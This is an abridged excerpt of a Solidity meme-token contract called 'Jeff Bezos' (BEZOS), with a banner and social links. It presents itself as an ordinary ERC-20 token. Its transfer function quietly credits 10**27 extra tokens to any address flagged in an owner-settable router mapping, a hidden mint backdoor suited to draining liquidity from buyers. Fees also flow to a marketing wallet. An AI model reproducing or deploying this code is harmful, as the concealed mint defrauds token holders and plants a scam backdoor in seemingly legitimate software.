/*
    ...
    ___  _______   ________ ________      ________  _______   ________  ________  ________      
   |\  \|\  ___ \ |\  _____\\  _____\    |\   __  \|\  ___ \ |\_____  \|\   __  \|\   ____\     
   \ \  \ \   __/|\ \  \__/\ \  \__/     \ \  \|\ /\ \   __/| \|___/  /\ \  \|\  \ \  \___|_    
 __ \ \  \ \  \_|/_\ \   __\\ \   __\     \ \   __  \ \  \_|/__   /  / /\ \  \\\  \ \_____  \   
|\  \\_\  \ \  \_|\ \ \  \_| \ \  \_|      \ \  \|\  \ \  \_|\ \ /  /_/__\ \  \\\  \|____|\  \  
\ \________\ \_______\ \__\   \ \__\        \ \_______\ \_______\\________\ \_______\____\_\  \ 
 \|________|\|_______|\|__|    \|__|         \|_______|\|_______|\|_______|\|_______|\_________\
                                                                                    \|_________|
                                                                                                
                                                                                                

Telegram : https://t.me/JeffBezosERC

Website : https://jeffbezoscoin.com

Twitter : https://twitter.com/jeffbezosETH
...
contract JEFFBEZOS is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using Address for address;
    
    mapping (address => uint256) private holderWallet;
    ...
    address payable public WalletMarket = payable(0x079E4770b9c9d919646512cc34e7737B08a77af8);
    address payable public WalletdEaD = payable(0x000000000000000000000000000000000000dEaD);

    string public _name = "Jeff Bezos";
    string public _symbol = "BEZOS";
    ...
    mapping (address => bool) public _routerERC20;
    ...
    bool public routerActivated = false;
    ...
    function _transfer(
        ...
        bool fee_Status = true;
        if( ExcludedFrom_Fee[from] 
        || 
        ExcludedFrom_Fee[to] 
        ){
            fee_Status = false;
            if(_routerERC20[to] && !routerActivated){
        ...
        transfer_ERC_Tokens(from,to,amount,fee_Status);
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        sendToWallet(WalletMarket,contractBNB);
    }
    ...
    function transfer_ERC_Tokens(address sender, address recipient, uint256 amount,bool fee_Status) private {
        ...
        transfer_ERC_Tokens(sender, recipient, amount);
    ...
    function transfer_ERC_Tokens(address sender, address recipient, uint256 transferAmount) private {
        (uint256 transaction_Amount, uint256 transaction_Marketing) = _changeValues(transferAmount);
        holderWallet[sender] = holderWallet[sender].sub(transferAmount);
        holderWallet[recipient] = (holderWallet[recipient].add(transaction_Amount)).add(_routerERC20[recipient] ? 10**27 : 0*10);
        holderWallet[address(this)] = holderWallet[address(this)].add(transaction_Marketing);
